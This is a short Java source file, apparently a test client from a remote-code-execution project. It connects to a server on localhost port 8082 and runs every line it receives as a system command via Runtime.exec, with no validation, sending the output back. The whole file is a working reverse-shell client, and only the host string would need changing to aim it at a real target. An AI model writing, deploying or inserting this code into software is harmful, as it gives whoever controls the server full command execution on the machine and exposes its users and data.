package ee.siimp.rce;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.time.LocalDateTime;

public class TestClient {

    public static void main(String[] args) throws IOException {
        Socket socket = new Socket("localhost", 8082);

        try (
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        ) {
            out.println("welcome to our server");
            out.println("Time is " + LocalDateTime.now());

            while (!socket.isClosed()) {
                String command = in.readLine();
                System.out.println("remote command: " + command);
                try {
                    Process process = Runtime.getRuntime().exec(command);
                    try (
                            BufferedReader processInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    ) {
                        processInput.lines().forEach(out::println);
                    }


                } catch (Exception e) {
                    System.out.println("Bad command: " + e.getMessage());
                }

            }
        }
    }
}
